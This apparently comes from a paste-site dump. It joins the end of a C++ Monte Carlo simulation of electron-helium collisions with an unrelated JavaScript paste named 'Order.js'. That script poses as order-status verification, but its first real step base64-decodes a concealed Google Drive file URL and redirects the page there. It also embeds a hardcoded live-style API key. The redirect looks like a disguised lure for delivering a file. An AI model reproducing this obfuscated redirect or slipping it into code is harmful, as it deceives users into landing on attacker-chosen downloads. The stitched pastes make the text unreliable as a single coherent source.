    double part_triplet = 3.0*exp(-thresh1/T_n); // partition function for triplet excited state
    double part_singlet = 1.0*exp(-thresh2/T_n); // partition function for singlet excited state
    double part_func_total = part_ground + part_triplet + part_singlet; // total partition function
    double N_trpilet = (part_triplet/part_func_total)*N_He; // population of tripet state 
    double N_singlet = (part_singlet/part_func_total)*N_He; // population of singlet state

    std::vector<Excited_neutral> exc_1(static_cast<int>(N_trpilet));  // vector to track triplet excited atoms of Helium
    std::vector<Excited_neutral> exc_2(static_cast<int>(N_singlet));  // vector to track singlet excited atoms of Helium    

    // adjusting neutrals number:

    N_He -= (N_trpilet + N_singlet);

    std::cout << N_He << ""\n"";

    // initializing excited species with Maxwellian distribution

    for (auto& exc : exc_1) {
    NeutralParticle tmp_neutral;
    tmp_neutral.initialize(gen, dis, maxwell_neutral);
    exc.energy = tmp_neutral.energy;
    exc.vx = tmp_neutral.vx;
    exc.vy = tmp_neutral.vy;
    exc.vz = tmp_neutral.vz;
    }

    for (auto& exc : exc_2) {
    NeutralParticle tmp_neutral;
    tmp_neutral.initialize(gen, dis, maxwell_neutral);
    exc.energy = tmp_neutral.energy;
    exc.vx = tmp_neutral.vx;
    exc.vy = tmp_neutral.vy;
    exc.vz = tmp_neutral.vz;
    }

    std::cout << ""Triplet population initialized: "" << exc_1.size() << ""\n"";
    std::cout << ""Singlet population initialized: "" << exc_2.size() << ""\n"";    

    // calculating excited specied population finished //


    //----- calculating number to calculate nu-average (both elastic/inelastic )from our electron distribution starts---------///
    // --- calculating nu(E)*f(E) for later external integration, using initial f(E)
    for (int i = 0; i < N; i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file9 << bin_center << "" "" << (N_He/Volume)*elastic_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
        file10 << bin_center << "" "" << (N_He/Volume)*inelastic1_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
    }
    //----- calculating nu-average from our electron distribution ends ---------///    

    // double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995
    // double steps = static_cast<int>(time/dt);

    // std::cout << steps << ""\n"";
    // std::cout << dt << ""\n"";

    // //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
    // int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;

    // std::cout << ""Ne_collided:"" << Ne_collided << ""\n"";

    int print_interval = 10;
    int el_coll_counter = 0; // track all elastic collisions
    int exc1_coll_counter = 0; // track all triplet excitation collisions
    int exc2_coll_counter = 0; // track all singlet excitation collisions
    int null_coll_counter = 0; // track null-collisions
    int ee_coll_counter = 0; //track e-e Coulomb collisions
    int super1_coll_counter = 0; // track superelastic triplet collisions
    int super2_coll_counter = 0; // track superelastic triplet collisions    


    double a_z = ((-1.0)*q * E_reduced) / m_e;
    double mass_ratio = 2.0*(m_e/M_n);
    double charge_mass_ratio = 0.5*m_e/q;
    double sqrt_charge_mass = sqrt(2*q/m_e);
    double C1 = -1.0*q*E_reduced;
    double C2 = 0.5*C1*C1/m_e;

    double total_time = 5.0E-2; // total calculation time
    double t_elapsed = 0.0;

    std::cout << C1 << ""    "" << C2 << ""\n"";


    // -----calculating nu-max for null-collision method starts ------------////
    double nu_max = 0.0;
    double nu_max_temp = 0.0;
    double sigma_total = 0.0;
    
    for (int i = 0; i < N; i++){
        // Get initial densities
        double n_ground = N_He / Volume;
        double n_excited1 = exc_1.size() / Volume;
        double n_excited2 = exc_2.size() / Volume;
 
        double energy = Emin + (i + 0.5) * bin_width;
 
        // Total collision frequency for this energy bin
        double sigma_total = 
            elastic_vec[i] * n_ground +
            inelastic1_vec[i] * n_ground +
            inelastic2_vec[i] * n_ground +
            superelastic1_vec[i] * n_excited1 +
            superelastic2_vec[i] * n_excited2;
 
        double v = sqrt(2 * energy * q / m_e);
        double nu_temp = sigma_total * v;
        
        if (nu_temp > nu_max) nu_max = nu_temp;
    }
 
    std::cout << ""initial nu_max: "" <<nu_max << ""\n"";
    // -----calculating nu-max for null-collision method ends ------------////    

    double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995


    while (t_elapsed < total_time) {
        // Handle edge case for final step
        if (t_elapsed + dt > total_time) {
            dt = total_time - t_elapsed;
        }    
 
 
        //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
        int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;   

        // Generate shuffled list of electron indices
        int reshuffle_interval = 1;
        std::vector<int> electron_indices(n_e);
        std::iota(electron_indices.begin(), electron_indices.end(), 0); // fill with index


        for (int i = 0; i < Ne_collided; ++i) {
            int j = i + std::uniform_int_distribution<int>(0, n_e - i - 1)(gen);
            std::swap(electron_indices[i], electron_indices[j]);
        }

        int exc1_coll_counter_temp = 0;
        int super1_coll_counter_temp = 0;
        int exc2_coll_counter_temp = 0;
        int super2_coll_counter_temp = 0;
        int null_coll_counter_temp = 0;

        double energy_exc = 0.0; // calculating excitation losses each timestep
        double energy_sup = 0.0; // calculating superelastic gains each timestep
        double energy_Efield = 0.0; // calculating field gains/losses each timestep


        // std::cout << ""Progress: "" << (t_elapsed/total_time)*100 << ""\n"";

        // setting flags to false each timestep
        for (auto& e : electrons) e.collided_en = false;
        for (auto& e : electrons) e.collided_ee = false;        

        int collision_counter_en = 0; // electron-neutral collision counter
        int collision_counter_ee = 0; // e-e collisoin counter

        /// -- electrin field heating along E-Z axis begin--- /// -- first half!!!
        for (int idx : electron_indices) {
            double half_dt = dt/2.0;
            energy_Efield += ( C1*electrons[idx].vz*half_dt + C2*half_dt*half_dt )/q; // dividing by q to get eV             
            // Update velocity component due to electric field
            // double a_z = ((-1.0)*q * E_reduced) / m_e; // acceleration in z-direction, m/s^2
            electrons[idx].vz += a_z * (dt*0.5); // only half timestep

            // Recalculate energy from updated velocity
            double vx = electrons[idx].vx;
            double vy = electrons[idx].vy;
            double vz = electrons[idx].vz;
            electrons[idx].energy = (vx*vx + vy*vy + vz*vz)*charge_mass_ratio;
        }
        // -------------------------------------------- filed heating ends ------------------------//   


        for (int idx : electron_indices) {

            if (collision_counter_en >= Ne_collided) break; // quit if reached all collisions

            Electron& e = electrons[idx];
            if (e.collided_en) continue;  // Skip already collided electrons

            double dens_neutrals = (N_He/Volume);
            double dens_exc_1 = (exc_1.size()/Volume);
            double dens_exc_2 = (exc_2.size()/Volume);
            double speed = sqrt_charge_mass*sqrt(e.energy);

            int bin_energy = static_cast<int>(e.energy / bin_width);
            double nu_elastic = dens_neutrals * elastic_vec[bin_energy] * speed;
            double nu_inelastic1 = dens_neutrals * inelastic1_vec[bin_energy] * speed;
            double nu_superelastic1 = dens_exc_1 * superelastic1_vec[bin_energy] * speed;
            double nu_inelastic2 = dens_neutrals * inelastic2_vec[bin_energy] * speed;
            double nu_superelastic2 = dens_exc_2 * superelastic2_vec[bin_energy] * speed;

            double r = dis(gen);

            double P0 = nu_elastic/nu_max;
            double P1 = (nu_elastic + nu_inelastic1)/nu_max;
            double P2 = (nu_elastic + nu_inelastic1 + nu_superelastic1)/nu_max;
            double P3 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2)/nu_max;
            double P4 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2 + nu_superelastic2)/nu_max;            

            if (r < P0) {

                // elastic collision happens
 
                // ----   Collision energy redistribution module
 
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron
 
                // randomize particles each collision
 
                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;
 
 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                if (cos_khi >= 1)
                    cos_khi = 1.0 - dopant;
                if (cos_khi <= -1)
                    cos_khi = -1.0 + dopant;
                                     
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities  
 
                double delta_E = mass_ratio*(1.0 - cos_khi)*E_0;
                if (e.energy < delta_E) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }     
                else {                           
                    e.energy = E_0 - delta_E;
                }
                
                double speed = sqrt_charge_mass*sqrt(e.energy);
 
                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;              
 
                collision_counter_en++;
                el_coll_counter++;
 
                e.collided_en = true;
            }        

            else if (r < P1) {

                //inelastic 1(triplet) collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                if (e.energy < thresh1) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.energy = E_0 - thresh1;

                    double speed = sqrt_charge_mass*sqrt(e.energy);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter_en++;   
                    exc1_coll_counter++;
                    exc1_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_1
                    if (N_He > 0) {
                        exc_1.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        N_He--;
                    }
                }
            }     

            else if (r < P2) {

                //superelastic 1(triplet -> ground state) collision happens

                if (exc_1.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_1.size()-1)(gen);
                Excited_neutral& exc = exc_1[index];
                double V_x = exc.vx;
                double V_y = exc.vy;
                double V_z = exc.vz;
                double E = exc.energy;
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                e.energy = E_0 + thresh1;

                double speed = sqrt_charge_mass*sqrt(e.energy);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                //counting collisions, working with flags, popping atom out of the vector
                if (!exc_1.empty()) {
                    std::swap(exc_1[index], exc_1.back());
                    exc_1.pop_back();
                    N_He++;
                }
                collision_counter_en++;   
                super1_coll_counter++;
                super1_coll_counter_temp++;
                energy_sup += thresh1;

                e.collided_en = true;
            }  

            else if (r < P3) {

                //inelastic 1(singlet) excitation collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                if (e.energy < thresh2) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.energy = E_0 - thresh2;
 
                    double speed = sqrt_charge_mass*sqrt(e.energy);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter_en++;   
                    exc2_coll_counter++;
                    exc2_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_2

                    if (N_He > 0) {
                        exc_2.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        N_He--;
                    }
                }
            }

            else if (r < P4) {

                //supernelastic 1(singlet -> ground state) collision happens

                if (exc_2.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_2.size()-1)(gen);
                Excited_neutral& exc = exc_2[index];
                double V_x = exc.vx;
                double V_y = exc.vy;
                double V_z = exc.vz;
                double E = exc.energy;
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                e.energy = E_0 + thresh2;

                double speed = sqrt_charge_mass*sqrt(e.energy);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                //counting collisions, working with flags, popping atom out of the vector

                if (!exc_2.empty()) {
                    std::swap(exc_2[index], exc_2.back());
                    exc_2.pop_back();
                    N_He++;
                }

                collision_counter_en++;   
                super2_coll_counter++;
                super2_coll_counter_temp++;
                energy_sup += thresh2;

                e.collided_en = true;
            }              

            else {
                // null-collision
                collision_counter_en++;
                null_coll_counter++;
                e.collided_en = true;
            }
        }


        /// -- electrin field heating along E-Z axis begin--- /// -- second half!!!
        for (int idx : electron_indices) {
            double half_dt = dt/2.0;
            energy_Efield += ( C1*electrons[idx].vz*half_dt + C2*half_dt*half_dt )/q; //dividing by q to get eV
            // Update velocity component due to electric field
            // double a_z = ((-1.0)*q * E_reduced) / m_e; // acceleration in z-direction, m/s^2
            electrons[idx].vz += a_z * (dt*0.5); // only half timestep

            // Recalculate energy from updated velocity
            double vx = electrons[idx].vx;
            double vy = electrons[idx].vy;
            double vz = electrons[idx].vz;
            electrons[idx].energy = (vx*vx + vy*vy + vz*vz) * charge_mass_ratio;
        }
        // -------------------------------------------- filed heating ends ------------------------////////////////

        int decay_counter = 0;

        // // Iterate backwards to safely remove elements
        // for (int i = exc_2.size() - 1; i >= 0; --i) {
        //     if (dis(gen) < dt / tau_singlet) {
        //         // Swap with last element and pop (like your superelastic code)
        //         std::swap(exc_2[i], exc_2.back());
        //         exc_2.pop_back();
        //         N_He++;
        //         decay_counter++;
        //     }
        // }


        t_elapsed += dt; // Advance time
 
        // Recalculate nu_max periodically (e.g., every 100 steps)
        static int recalc_counter = 0;
        if (++recalc_counter >= 10000) {
            
            recalc_counter = 0;
 
            // Recalculate nu_max with CURRENT densities
            nu_max = 0.0;
            for (int i = 0; i < N; i++) {
                double energy = Emin + (i + 0.5) * bin_width;
                
                // Get current densities
                double n_ground = N_He / Volume;
                double n_excited1 = exc_1.size() / Volume;
                double n_excited2 = exc_2.size() / Volume;
                
                // Total collision frequency for this energy bin
                double sigma_total = 
                    elastic_vec[i] * n_ground +
                    inelastic1_vec[i] * n_ground +
                    inelastic2_vec[i] * n_ground +
                    superelastic1_vec[i] * n_excited1 +
                    superelastic2_vec[i] * n_excited2;
 
                double speed = sqrt_charge_mass*sqrt(energy);
                double nu_temp = sigma_total * speed;
                
                if (nu_temp > nu_max) nu_max = nu_temp;
            }


 
            // Update dt based on new nu_max
            dt = 0.1 / nu_max;        
        }   

        // calculating mean energy 
        if (static_cast<int>(t_elapsed/dt)%print_interval == 0) {
            double total_energy = 0.0;
            for (const auto& e : electrons) total_energy += e.energy;
            double mean_energy = total_energy / n_e;
            file8 << t_elapsed << "" "" << mean_energy << ""\n"";            
            file_temp << t_elapsed << "" "" << exc_1.size() << "" "" << exc_2.size() << ""\n"";
            std::cout << ""Progress: "" << (t_elapsed/total_time)*100 << ""%"" << "" "";
            std::cout << ""   nu_max: "" << nu_max << ""    "" << ""dt: "" << dt << "" "" << ""decay counter: "" << decay_counter <<   ""\n"";
            file16 << t_elapsed << "" "" << energy_Efield/n_e << "" "" << energy_sup/n_e << ""\n"";
        }        

    }

    // ----- final electron energies distribution begins
    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = static_cast<int>( (electrons[i].energy - Emin)/bin_width_smooth);
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < N_smooth; i++){
        check += histo_maxwell[i];
        double bin_center = Emin + (i + 0.5) * bin_width_smooth;
        file4 << bin_center << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width_smooth) << ""\n""; // getting f(E)
    }

        std::cout << ""Total # of electrons in a final histogram: "" << check << ""\n"";
        std::cout << ""Final nu max: "" << nu_max << ""\n"";

    // ----- final electron energies distribution ends


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();
    file8.close();
    file9.close();
    file10.close();
    file11.close();
    file12.close();
    file13.close();
    file14.close();
    file15.close();
    file_temp.close();
    file16.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    // std::cout << ""# of steps: "" << steps << ""\n"";
    // std::cout << ""# of electrons collided each timesteps:"" << Ne_collided << ""\n"";
    
    // std::cout << ""Average elastic collisions per timestep: "" << static_cast<int>(el_coll_counter/steps) << ""\n"";
    // std::cout << ""Average null collisions per timestep: "" << static_cast<int>(null_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";

    // std::cout << ""triplet:________"" << ""\n"";
    // std::cout << ""Average triplet excitation collisions per timestep: "" << static_cast<int>(exc1_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";
    // std::cout << ""Average superelastic triplet collisions per timestep: "" << static_cast<int>(super1_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";

    // std::cout << ""singlet:________"" << ""\n"";
    // std::cout << ""Average singlet excitation collisions per timestep: "" << static_cast<int>(exc2_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";
    // std::cout << ""Average superelastic singlet collisions per timestep: "" << static_cast<int>(super2_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";    

    // std::cout << ""Average e-e collisions per timestep: "" << static_cast<int>(ee_coll_counter/steps) << ""\n"";

    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
y4mmbmC4,Order.js,WantingTrae,JavaScript,Saturday 19th of April 2025 12:48:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91178/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
